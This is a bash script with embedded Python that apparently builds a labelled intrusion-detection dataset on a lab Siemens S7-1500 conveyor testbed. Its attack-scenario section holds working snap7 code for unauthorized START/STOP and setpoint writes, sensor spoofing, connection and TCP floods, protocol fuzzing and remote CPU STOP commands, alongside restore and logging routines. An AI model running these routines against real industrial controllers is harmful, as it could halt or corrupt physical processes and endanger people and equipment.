#!/usr/bin/env bash
set -euo pipefail

# ================================================================
# run_day_bangtruyen.sh
# Dataset collection for one ATTACKER host, one CONTROLLER host, one S7 PLC.
#
# Main safety choices for S7-1500:
#   - Rack/slot/interface/IP are read from testbed.conf or CLI.
#   - CPU STOP/START attack is disabled by default.
#   - RWRITE attack writes Merker control bits, not PA/Q outputs.
#   - Controller HMI is observe-only by default, so it does not mask attacks.
#   - Timeline schema carries session_id, host_id, episode_id, day, note.
#   - Write-style attacks also emit attack_events CSV with signal old/new values.
#
# Pre-run checklist:
#   1. Set TARGET_IP/RACK/SLOT and CAPTURE_IFACE in testbed.conf.
#   2. Confirm PLC is powered, reachable, in a lab-safe state, and PUT/GET is enabled.
#   3. Run: tshark -D
#   4. Run: bash run_day_bangtruyen.sh --day 1 --role attacker --preflight-only --no-capture
#   5. Confirm Git Bash resolves python/python3 to the environment with python-snap7.
# ================================================================

[[ -f testbed.conf ]] && source ./testbed.conf

if [[ -z "${PY_CMD:-}" ]]; then
    command -v python3 &>/dev/null && PY_CMD="python3" || PY_CMD="python"
fi

export PYTHONPATH="${PYTHONPATH:-.}"

DAY=""
ROLE=""
TARGET_IP="${TARGET_IP:-192.168.1.10}"
RACK="${RACK:-0}"
SLOT="${SLOT:-1}"
CAPTURE_IFACE="${CAPTURE_IFACE:-${IFACE:-}}"
CAPTURE_ENABLED="${CAPTURE_ENABLED:-1}"
CAPTURE_FILTER="${CAPTURE_FILTER:-}"
SESSION_ID="${SESSION_ID:-}"
HOST_ID="${HOST_ID:-}"
RUN_DURATION_OVERRIDE=""
PREFLIGHT_ENABLED="${PREFLIGHT_ENABLED:-1}"
REQUIRE_PREFLIGHT="${REQUIRE_PREFLIGHT:-1}"
PREFLIGHT_WRITE_TEST="${PREFLIGHT_WRITE_TEST:-0}"
ENABLE_CPU_CONTROL_ATTACK="${ENABLE_CPU_CONTROL_ATTACK:-0}"

CAPTURE_DIR="${CAPTURE_DIR:-captures}"
LOG_DIR="${LOG_DIR:-logs}"
LABEL_DIR="${LABEL_DIR:-labels}"
ATTACK_EVENT_LOG_ENABLED="${ATTACK_EVENT_LOG_ENABLED:-1}"

DAY1_DURATION_S="${DAY1_DURATION_S:-${DUR_DAY1:-14400}}"
DAY2_DURATION_S="${DAY2_DURATION_S:-${DUR_DAY2:-14400}}"
DAY3_DURATION_S="${DAY3_DURATION_S:-${DUR_DAY3:-10800}}"
DAY4_DURATION_S="${DAY4_DURATION_S:-${DUR_DAY4:-14400}}"
DAY5_DURATION_S="${DAY5_DURATION_S:-${DUR_DAY5:-10800}}"
DAY6_DURATION_S="${DAY6_DURATION_S:-${DUR_DAY6:-14400}}"

WARMUP_S="${WARMUP_S:-300}"
BENIGN_GAP_S="${BENIGN_GAP_S:-300}"
COOLDOWN_S="${COOLDOWN_S:-600}"
ATTACK_REPETITIONS="${ATTACK_REPETITIONS:-3}"
ATTACK_DURATION_S="${ATTACK_DURATION_S:-600}"
SHORT_ATTACK_DURATION_S="${SHORT_ATTACK_DURATION_S:-300}"

DEFAULT_CD_MS="${DEFAULT_CD_MS:-5000}"
RESTORE_TIMES1_MS="${RESTORE_TIMES1_MS:-0}"
RESTORE_START_PULSE="${RESTORE_START_PULSE:-1}"

ENABLE_TAG_LOGGER="${ENABLE_TAG_LOGGER:-1}"
TAG_LOG_INTERVAL="${TAG_LOG_INTERVAL:-0.5}"
ENABLE_HMI="${ENABLE_HMI:-1}"
HMI_ENABLE_LEGIT_WRITES="${HMI_ENABLE_LEGIT_WRITES:-0}"
HMI_LEGIT_WRITE_PROB="${HMI_LEGIT_WRITE_PROB:-0.02}"
HMI_POLL_MIN_S="${HMI_POLL_MIN_S:-1.0}"
HMI_POLL_MAX_S="${HMI_POLL_MAX_S:-2.0}"

S7_FLOOD_THREADS="${S7_FLOOD_THREADS:-6}"
SYN_FLOOD_THREADS="${SYN_FLOOD_THREADS:-20}"
FUZZ_PAYLOAD_MIN="${FUZZ_PAYLOAD_MIN:-12}"
FUZZ_PAYLOAD_MAX="${FUZZ_PAYLOAD_MAX:-80}"

usage() {
    cat <<'EOF'
Usage:
  bash run_day_bangtruyen.sh --day <1-6> --role <controller|attacker> [options]

Options:
  --target IP             PLC IP address.
  --rack N                PLC rack, default 0.
  --slot N                PLC slot, default 1.
  --iface IFACE           TShark capture interface. Use `tshark -D` to list.
  --session-id ID         Shared session id for controller and attacker.
  --host-id ID            Host id written to labels/tag logs.
  --duration SECONDS      Override role runtime or benign day runtime.
  --no-capture            Run logic without starting tshark.
  --no-preflight          Skip Snap7 preflight.
  --preflight-only        Run preflight and exit.
  --enable-cpu-control    Opt in to CPU_STOP attack. Default is disabled.

Examples:
  Controller host:
    bash run_day_bangtruyen.sh --day 4 --role controller --session-id bt_s1 --iface "\\Device\\NPF_{GUID}"

  Attacker host:
    bash run_day_bangtruyen.sh --day 4 --role attacker --session-id bt_s1 --iface "\\Device\\NPF_{GUID}"
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --day) DAY="$2"; shift 2 ;;
        --role) ROLE="$2"; shift 2 ;;
        --target) TARGET_IP="$2"; shift 2 ;;
        --rack) RACK="$2"; shift 2 ;;
        --slot) SLOT="$2"; shift 2 ;;
        --iface) CAPTURE_IFACE="$2"; shift 2 ;;
        --session-id) SESSION_ID="$2"; shift 2 ;;
        --host-id) HOST_ID="$2"; shift 2 ;;
        --duration) RUN_DURATION_OVERRIDE="$2"; shift 2 ;;
        --no-capture) CAPTURE_ENABLED="0"; shift ;;
        --no-preflight) PREFLIGHT_ENABLED="0"; shift ;;
        --preflight-only) PREFLIGHT_ONLY="1"; shift ;;
        --enable-cpu-control) ENABLE_CPU_CONTROL_ATTACK="1"; shift ;;
        -h|--help) usage; exit 0 ;;
        *) echo "[ERROR] Unknown option: $1" >&2; usage; exit 1 ;;
    esac
done

[[ -z "$DAY" ]] && { echo "[ERROR] Missing --day (1-6)" >&2; usage; exit 1; }
[[ -z "$ROLE" ]] && { echo "[ERROR] Missing --role" >&2; usage; exit 1; }
[[ "$DAY" =~ ^[1-6]$ ]] || { echo "[ERROR] DAY must be 1..6" >&2; exit 1; }
[[ "$ROLE" == "controller" || "$ROLE" == "attacker" ]] || { echo "[ERROR] ROLE must be controller or attacker" >&2; exit 1; }

if [[ -z "$SESSION_ID" ]]; then
    SESSION_ID="day${DAY}_bt_s1"
fi
if [[ -z "$HOST_ID" ]]; then
    if [[ "$ROLE" == "controller" ]]; then
        HOST_ID="${CONTROLLER_HOST_ID:-controller_host}"
    else
        HOST_ID="${ATTACKER_HOST_ID:-attacker_host}"
    fi
fi
if [[ -z "$CAPTURE_FILTER" ]]; then
    CAPTURE_FILTER="host $TARGET_IP"
fi

mkdir -p "$CAPTURE_DIR/day${DAY}" "$LOG_DIR" "$LABEL_DIR"

declare -a PIDS=()
cleanup() {
    for p in "${PIDS[@]:-}"; do
        kill "$p" 2>/dev/null || true
    done
}
trap cleanup EXIT INT TERM

echo "=== run_day_bangtruyen.sh day=$DAY role=$ROLE target=$TARGET_IP rack=$RACK slot=$SLOT session=$SESSION_ID host=$HOST_ID ==="
if [[ "$ENABLE_CPU_CONTROL_ATTACK" != "1" ]]; then
    echo "[info] CPU_STOP attack disabled. Set ENABLE_CPU_CONTROL_ATTACK=1 or --enable-cpu-control only if PLC permits it."
fi

now_ms() {
    "$PY_CMD" -c "import time; print(int(time.time() * 1000))"
}

label_file() {
    echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_timeline.csv"
}

attack_event_file() {
    echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_attack_events.csv"
}

label() {
    local scenario="$1"
    local action="$2"
    local episode_id="${3:-}"
    local note="${4:-}"
    local ts
    local f
    ts="$(now_ms)"
    f="$(label_file)"
    [[ ! -f "$f" ]] && echo "attacker_timestamp_ms,scenario_label,action,session_id,host_id,episode_id,day,note" > "$f"
    note="${note//,/;}"
    episode_id="${episode_id//,/;}"
    printf '%s,%s,%s,%s,%s,%s,%s,%s\n' "$ts" "$scenario" "$action" "$SESSION_ID" "$HOST_ID" "$episode_id" "$DAY" "$note" >> "$f"
    echo "[$(date +%H:%M:%S)] label $scenario $action episode=$episode_id note=$note"
}

wait_s() {
    local seconds="$1"
    local message="${2:-wait}"
    [[ "$seconds" -le 0 ]] && return 0
    echo "[wait] ${seconds}s -- $message"
    sleep "$seconds"
}

duration_for_day() {
    local var="DAY${DAY}_DURATION_S"
    if [[ -n "$RUN_DURATION_OVERRIDE" ]]; then
        echo "$RUN_DURATION_OVERRIDE"
    else
        echo "${!var}"
    fi
}

rand_duration() {
    local base="${1:-$ATTACK_DURATION_S}"
    "$PY_CMD" -c "import random,sys; b=max(1,int(float(sys.argv[1]))); lo=max(1,int(b*0.75)); hi=max(lo,int(b*1.25)); print(random.randint(lo, hi))" "$base"
}

start_capture() {
    local suffix="$1"
    local pcap="$CAPTURE_DIR/day${DAY}/${SESSION_ID}_${suffix}.pcapng"
    if [[ "$CAPTURE_ENABLED" != "1" ]]; then
        echo "[$suffix] capture disabled"
        return 0
    fi
    tshark -n -i "$CAPTURE_IFACE" -f "$CAPTURE_FILTER" -w "$pcap" -q \
        -o "tls.desegment_ssl_records:FALSE" \
        -o "tls.desegment_ssl_application_data:FALSE" &
    PIDS+=("$!")
    echo "[$suffix] tshark -> $pcap"
}

print_tshark_interfaces() {
    if command -v tshark &>/dev/null; then
        echo "[capture] Available TShark interfaces:"
        tshark -D || true
    else
        echo "[capture] tshark is not in PATH. Install Wireshark/TShark and reopen Git Bash/terminal."
    fi
}

validate_capture_config() {
    [[ "$CAPTURE_ENABLED" == "1" ]] || return 0
    if ! command -v tshark &>/dev/null; then
        echo "[ERROR] CAPTURE_ENABLED=1 but tshark was not found." >&2
        print_tshark_interfaces >&2
        exit 2
    fi
    if [[ -z "$CAPTURE_IFACE" ]]; then
        echo "[ERROR] CAPTURE_ENABLED=1 but CAPTURE_IFACE/--iface is empty." >&2
        echo "[ERROR] Run 'tshark -D' and set CAPTURE_IFACE in testbed.conf or pass --iface." >&2
        print_tshark_interfaces >&2
        exit 2
    fi
    local ifaces
    ifaces="$(tshark -D 2>/dev/null || true)"
    if [[ "$CAPTURE_IFACE" =~ ^[0-9]+$ ]]; then
        if ! grep -Eq "^[[:space:]]*${CAPTURE_IFACE}\." <<<"$ifaces"; then
            echo "[ERROR] TShark interface index '$CAPTURE_IFACE' was not found." >&2
            print_tshark_interfaces >&2
            exit 2
        fi
    elif ! grep -Fq -- "$CAPTURE_IFACE" <<<"$ifaces"; then
        echo "[ERROR] TShark interface '$CAPTURE_IFACE' was not found." >&2
        print_tshark_interfaces >&2
        exit 2
    fi
}

preflight_plc() {
    "$PY_CMD" - <<PYEOF
import os
import sys
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
write_test = "$PREFLIGHT_WRITE_TEST" == "1"

c = snap7.client.Client()
try:
    print(f"[preflight] connect {target} rack={rack} slot={slot}", flush=True)
    c.connect(target, rack, slot)
    state = "UNKNOWN"
    try:
        state = str(c.get_cpu_state())
    except Exception as exc:
        print(f"[preflight][WARN] cannot read CPU state: {exc}", flush=True)
    print(f"[preflight] CPU state: {state}", flush=True)

    m5 = c.read_area(Areas.MK, 0, 5, 1)
    print(f"[preflight] read M5 OK: 0x{m5[0]:02X}", flush=True)
    try:
        q0 = c.read_area(Areas.PA, 0, 0, 1)
        print(f"[preflight] read Q0 OK: 0x{q0[0]:02X}", flush=True)
    except Exception as exc:
        print(f"[preflight][WARN] read Q0 failed, logger will keep running with Q fields empty: {exc}", flush=True)

    if write_test:
        original = c.read_area(Areas.MK, 0, 5, 1)
        probe = bytearray(original)
        current = get_bool(probe, 0, 7)
        set_bool(probe, 0, 7, not current)
        c.write_area(Areas.MK, 0, 5, probe)
        time.sleep(0.1)
        c.write_area(Areas.MK, 0, 5, original)
        print("[preflight] Merker write test OK on M5.7 and restored", flush=True)

    c.disconnect()
    sys.exit(0)
except Exception as exc:
    print(f"[preflight][ERROR] Snap7 PUT/GET check failed: {exc}", flush=True)
    try:
        c.disconnect()
    except Exception:
        pass
    sys.exit(2)
PYEOF
}

restore_plc() {
    echo "[restore] Conveyor safe restore via Merker area"
    "$PY_CMD" - <<PYEOF || true
import sys
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import set_bool, set_dint

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
default_cd = int("$DEFAULT_CD_MS")
times1 = int("$RESTORE_TIMES1_MS")
start_pulse = "$RESTORE_START_PULSE" == "1"

def write_dint(client, offset, value):
    buf = bytearray(4)
    set_dint(buf, 0, int(value))
    client.write_area(Areas.MK, 0, offset, buf)

c = snap7.client.Client()
try:
    c.connect(target, rack, slot)
    try:
        state = str(c.get_cpu_state())
        print(f"[restore] CPU state: {state}", flush=True)
        if "Stop" in state or state == "4":
            print("[restore][WARN] CPU appears STOP. Start CPU manually in TIA/PLC panel; script will not issue remote CPU control.", flush=True)
    except Exception as exc:
        print(f"[restore][WARN] cannot read CPU state: {exc}", flush=True)

    m5 = c.read_area(Areas.MK, 0, 5, 1)
    for bit in range(8):
        set_bool(m5, 0, bit, False)
    c.write_area(Areas.MK, 0, 5, m5)

    m6 = c.read_area(Areas.MK, 0, 6, 1)
    set_bool(m6, 0, 0, False)  # Vat_3
    set_bool(m6, 0, 1, False)  # S1
    set_bool(m6, 0, 2, False)  # Tag_8
    c.write_area(Areas.MK, 0, 6, m6)

    write_dint(c, 50, times1)
    write_dint(c, 54, default_cd)
    write_dint(c, 58, default_cd)
    write_dint(c, 62, default_cd)
    print(f"[restore] timers restored: Times_1={times1} CD1/CD2/CD3={default_cd}", flush=True)

    if start_pulse:
        m5 = c.read_area(Areas.MK, 0, 5, 1)
        set_bool(m5, 0, 0, True)
        set_bool(m5, 0, 1, False)
        c.write_area(Areas.MK, 0, 5, m5)
        time.sleep(0.3)
        m5 = c.read_area(Areas.MK, 0, 5, 1)
        set_bool(m5, 0, 0, False)
        c.write_area(Areas.MK, 0, 5, m5)
        print("[restore] START pulse sent on M5.0", flush=True)

    c.disconnect()
    print("[restore] OK", flush=True)
except Exception as exc:
    print(f"[restore][WARN] restore failed: {exc}", flush=True)
    try:
        c.disconnect()
    except Exception:
        pass
PYEOF
    sleep 1
}

start_tag_logger() {
    [[ "$ENABLE_TAG_LOGGER" == "1" ]] || { echo "[ctrl] tag logger disabled"; return 0; }
    "$PY_CMD" log_tags_bangtruyen.py \
        --target "$TARGET_IP" \
        --rack "$RACK" \
        --slot "$SLOT" \
        --interval "$TAG_LOG_INTERVAL" \
        --output "$LOG_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_tags.csv" \
        --session-id "$SESSION_ID" \
        --host-id "$HOST_ID" \
        --scenario-id "BENIGN_READER" \
        --episode-id "${SESSION_ID}:controller:tag_logger" \
        --day "$DAY" &
    PIDS+=("$!")
    echo "[ctrl] tag logger started"
}

start_hmi() {
    [[ "$ENABLE_HMI" == "1" ]] || { echo "[ctrl] HMI disabled"; return 0; }
    "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import set_bool

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
poll_min = float("$HMI_POLL_MIN_S")
poll_max = float("$HMI_POLL_MAX_S")
enable_writes = "$HMI_ENABLE_LEGIT_WRITES" == "1"
write_prob = float("$HMI_LEGIT_WRITE_PROB")

c = snap7.client.Client()
print("[HMI] observe-only polling started" if not enable_writes else "[HMI] polling with rare legitimate START pulses", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
            print("[HMI] connected", flush=True)
        c.read_area(Areas.MK, 0, 0, 80)
        try:
            c.read_area(Areas.PA, 0, 0, 1)
        except Exception:
            pass
        try:
            c.read_area(Areas.PE, 0, 0, 1)
        except Exception:
            pass

        if enable_writes and random.random() < write_prob:
            m5 = c.read_area(Areas.MK, 0, 5, 1)
            set_bool(m5, 0, 0, True)
            set_bool(m5, 0, 1, False)
            c.write_area(Areas.MK, 0, 5, m5)
            time.sleep(0.2)
            m5 = c.read_area(Areas.MK, 0, 5, 1)
            set_bool(m5, 0, 0, False)
            c.write_area(Areas.MK, 0, 5, m5)
            print("[HMI] legitimate START pulse", flush=True)

        time.sleep(random.uniform(poll_min, poll_max))
    except Exception as exc:
        print(f"[HMI][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(2.0)
PYEOF
    PIDS+=("$!")
    echo "[ctrl] HMI started"
}

start_attack_process() {
    local scenario="$1"
    case "$scenario" in
        SCAN_PORT)
            "$PY_CMD" -u - <<PYEOF &
import random
import socket
import time

target = "$TARGET_IP"
print(f"[SCAN] TCP port 102 scan loop against {target}", flush=True)
while True:
    try:
        s = socket.create_connection((target, 102), timeout=1.0)
        s.close()
    except Exception:
        pass
    time.sleep(random.uniform(0.4, 1.5))
PYEOF
            ;;
        ENUM_TAGS)
            "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_dint

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
c = snap7.client.Client()
n = 0
print("[ENUM] reading M/Q/I areas", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        m = c.read_area(Areas.MK, 0, 0, 80)
        try:
            q = c.read_area(Areas.PA, 0, 0, 1)
            q0 = q[0]
        except Exception:
            q0 = -1
        try:
            c.read_area(Areas.PE, 0, 0, 1)
        except Exception:
            pass
        n += 1
        if n % 50 == 0:
            print(f"[ENUM] #{n} M5=0x{m[5]:02X} M6=0x{m[6]:02X} Q0={q0} CD1={get_dint(m,54)}", flush=True)
    except Exception as exc:
        print(f"[ENUM][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(0.15, 0.5))
PYEOF
            ;;
        RWRITE_BURST)
            "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
c = snap7.client.Client()
n = 0
toggle_stop = True
print("[RWRITE] Merker control burst on M5.0 START / M5.1 STOP; no PA/Q write", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        m5 = c.read_area(Areas.MK, 0, 5, 1)
        old_start = get_bool(m5, 0, 0)
        old_stop = get_bool(m5, 0, 1)
        if toggle_stop:
            set_bool(m5, 0, 0, False)
            set_bool(m5, 0, 1, True)
        else:
            set_bool(m5, 0, 1, False)
            set_bool(m5, 0, 0, True)
        new_start = get_bool(m5, 0, 0)
        new_stop = get_bool(m5, 0, 1)
        c.write_area(Areas.MK, 0, 5, m5)
        if old_start != new_start:
            log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start))
        if old_stop != new_stop:
            log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
        if not toggle_stop:
            time.sleep(0.12)
            m5 = c.read_area(Areas.MK, 0, 5, 1)
            old_start = get_bool(m5, 0, 0)
            set_bool(m5, 0, 0, False)
            new_start = get_bool(m5, 0, 0)
            c.write_area(Areas.MK, 0, 5, m5)
            if old_start != new_start:
                log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start), note="start_pulse_reset")
        toggle_stop = not toggle_stop
        n += 1
        if n % 50 == 0:
            print(f"[RWRITE] {n} Merker writes", flush=True)
    except Exception as exc:
        print(f"[RWRITE][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(0.15, 0.45))
PYEOF
            ;;
        SETPOINT_ATTACK)
            "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_dint, set_dint
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
c = snap7.client.Client()
values = [100, 250, 45000, 60000, 90000]
n = 0
print("[SETPOINT] randomizing CD1/CD2/CD3 timers", flush=True)
def read_dint(client, offset):
    return get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)
def write_dint(client, offset, value, signal):
    old = read_dint(client, offset)
    buf = bytearray(4)
    set_dint(buf, 0, int(value))
    client.write_area(Areas.MK, 0, offset, buf)
    if old != int(value):
        log_attack_event(signal, area="MK", byte_offset=offset, data_type="dint", old_value=old, new_value=int(value))
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        cd1 = random.choice(values)
        cd2 = random.choice(values)
        cd3 = random.choice(values)
        write_dint(c, 54, cd1, "CD1_MS")
        write_dint(c, 58, cd2, "CD2_MS")
        write_dint(c, 62, cd3, "CD3_MS")
        write_dint(c, 50, random.choice([0, 120000, 180000]), "Times_1_MS")
        n += 1
        if n % 20 == 0:
            print(f"[SETPOINT] #{n} CD1={cd1} CD2={cd2} CD3={cd3}", flush=True)
    except Exception as exc:
        print(f"[SETPOINT][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(0.4, 1.2))
PYEOF
            ;;
        SENSOR_SPOOF)
            "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
c = snap7.client.Client()
patterns = [(1,1,1), (1,0,1), (0,1,1)]
n = 0
print("[SPOOF] spoofing Vat_1/Vat_2/Vat_3 bits", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        v1, v2, v3 = random.choice(patterns)
        m5 = c.read_area(Areas.MK, 0, 5, 1)
        m6 = c.read_area(Areas.MK, 0, 6, 1)
        changes_m5 = []
        changes_m6 = []
        old = get_bool(m5, 0, 4)
        set_bool(m5, 0, 4, bool(v1))
        if old != bool(v1):
            changes_m5.append(("M5.4_Vat_1", 5, 4, old, bool(v1)))
        old = get_bool(m5, 0, 6)
        set_bool(m5, 0, 6, bool(v2))
        if old != bool(v2):
            changes_m5.append(("M5.6_Vat_2", 5, 6, old, bool(v2)))
        old = get_bool(m6, 0, 0)
        set_bool(m6, 0, 0, bool(v3))
        if old != bool(v3):
            changes_m6.append(("M6.0_Vat_3", 6, 0, old, bool(v3)))
        c.write_area(Areas.MK, 0, 5, m5)
        for signal, byte_offset, bit_offset, old_value, new_value in changes_m5:
            log_attack_event(signal, area="MK", byte_offset=byte_offset, bit_offset=bit_offset, data_type="bool", old_value=int(old_value), new_value=int(new_value))
        c.write_area(Areas.MK, 0, 6, m6)
        for signal, byte_offset, bit_offset, old_value, new_value in changes_m6:
            log_attack_event(signal, area="MK", byte_offset=byte_offset, bit_offset=bit_offset, data_type="bool", old_value=int(old_value), new_value=int(new_value))
        n += 1
        if n % 30 == 0:
            print(f"[SPOOF] #{n} Vat=({v1},{v2},{v3})", flush=True)
    except Exception as exc:
        print(f"[SPOOF][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(0.4, 1.5))
PYEOF
            ;;
        STEALTHY_WRITE)
            "$PY_CMD" -u - <<PYEOF &
import random
import time

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
c = snap7.client.Client()
n = 0
print("[STEALTHY] low-rate STOP writes on M5.1", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        m5 = c.read_area(Areas.MK, 0, 5, 1)
        old_stop = get_bool(m5, 0, 1)
        old_start = get_bool(m5, 0, 0)
        set_bool(m5, 0, 1, True)
        set_bool(m5, 0, 0, False)
        new_stop = get_bool(m5, 0, 1)
        new_start = get_bool(m5, 0, 0)
        c.write_area(Areas.MK, 0, 5, m5)
        if old_stop != new_stop:
            log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
        if old_start != new_start:
            log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start))
        n += 1
        if n % 10 == 0:
            print(f"[STEALTHY] #{n} STOP writes", flush=True)
    except Exception as exc:
        print(f"[STEALTHY][WARN] {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(1.0)
    time.sleep(random.uniform(1.5, 3.0))
PYEOF
            ;;
        S7_FLOOD)
            "$PY_CMD" -u - <<PYEOF &
import random
import threading
import time

import snap7

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
threads_n = int("$S7_FLOOD_THREADS")
lock = threading.Lock()
ok = 0
fail = 0
def worker():
    global ok, fail
    while True:
        try:
            c = snap7.client.Client()
            c.connect(target, rack, slot)
            time.sleep(random.uniform(0.03, 0.2))
            c.disconnect()
            with lock:
                ok += 1
                if ok % 100 == 0:
                    print(f"[S7_FLOOD] ok={ok} fail={fail}", flush=True)
        except Exception:
            with lock:
                fail += 1
            time.sleep(random.uniform(0.02, 0.15))
print(f"[S7_FLOOD] {threads_n} Snap7 connection workers", flush=True)
workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads_n)]
for t in workers:
    t.start()
while True:
    time.sleep(1)
PYEOF
            ;;
        SYN_FLOOD)
            "$PY_CMD" -u - <<PYEOF &
import socket
import threading
import time

target = "$TARGET_IP"
threads_n = int("$SYN_FLOOD_THREADS")
def worker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.08)
            s.connect((target, 102))
            s.close()
        except Exception:
            pass
print(f"[SYN_FLOOD] {threads_n} TCP connect workers on port 102", flush=True)
workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads_n)]
for t in workers:
    t.start()
while True:
    time.sleep(1)
PYEOF
            ;;
        PROTOCOL_FUZZ)
            "$PY_CMD" -u - <<PYEOF &
import os
import random
import socket
import time

target = "$TARGET_IP"
min_len = int("$FUZZ_PAYLOAD_MIN")
max_len = int("$FUZZ_PAYLOAD_MAX")
n = 0
print("[FUZZ] malformed TPKT/S7-like payloads on port 102", flush=True)
while True:
    try:
        payload = os.urandom(random.randint(min_len, max_len))
        pkt = b"\x03\x00" + (len(payload) + 4).to_bytes(2, "big") + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((target, 102))
        s.sendall(pkt)
        s.close()
        n += 1
        if n % 50 == 0:
            print(f"[FUZZ] {n} malformed packets", flush=True)
    except Exception:
        pass
    time.sleep(random.uniform(0.05, 0.25))
PYEOF
            ;;
        CPU_STOP)
            "$PY_CMD" -u - <<PYEOF &
import time

import snap7
from attack_event_logger import log_attack_event

target = "$TARGET_IP"
rack = int("$RACK")
slot = int("$SLOT")
c = snap7.client.Client()
print("[CPU_STOP] enabled by operator; attempting remote STOP/HOT_START", flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect(target, rack, slot)
        c.plc_stop()
        log_attack_event("CPU_STOP", area="CPU", data_type="cpu_command", new_value="STOP", status="command_sent")
        print("[CPU_STOP] STOP sent", flush=True)
        time.sleep(5)
        try:
            c.plc_hot_start()
            log_attack_event("CPU_HOT_START", area="CPU", data_type="cpu_command", new_value="HOT_START", status="command_sent")
            print("[CPU_STOP] HOT_START sent", flush=True)
        except Exception as exc:
            print(f"[CPU_STOP][WARN] HOT_START denied: {exc}", flush=True)
        time.sleep(15)
    except Exception as exc:
        print(f"[CPU_STOP][WARN] denied or failed: {exc}", flush=True)
        try:
            c.disconnect()
        except Exception:
            pass
        time.sleep(10)
PYEOF
            ;;
        *)
            echo "[ERROR] Unknown scenario: $scenario" >&2
            return 1
            ;;
    esac
    ATTACK_PID="$!"
    PIDS+=("$ATTACK_PID")
}

stop_pid() {
    local pid="$1"
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
}

needs_restore() {
    case "$1" in
        RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE|CPU_STOP) return 0 ;;
        *) return 1 ;;
    esac
}

run_attack_episode() {
    local scenario="$1"
    local duration_s="$2"
    local rep="$3"
    local episode_id="${SESSION_ID}:day${DAY}:${scenario}:r${rep}"
    local note="rep=${rep};duration_s=${duration_s};host=${HOST_ID}"
    local pid

    if [[ "$ATTACK_EVENT_LOG_ENABLED" == "1" ]]; then
        export ATTACK_EVENT_FILE
        ATTACK_EVENT_FILE="$(attack_event_file)"
    else
        export ATTACK_EVENT_FILE=""
    fi
    export ATTACK_EPISODE_ID="$episode_id" ATTACK_SCENARIO="$scenario" ATTACK_DAY="$DAY" SESSION_ID HOST_ID

    label "$scenario" "START" "$episode_id" "$note"
    start_attack_process "$scenario"
    pid="$ATTACK_PID"
    wait_s "$duration_s" "$scenario r$rep"
    stop_pid "$pid"
    if needs_restore "$scenario"; then
        restore_plc
    fi
    label "$scenario" "END" "$episode_id" "$note"
}

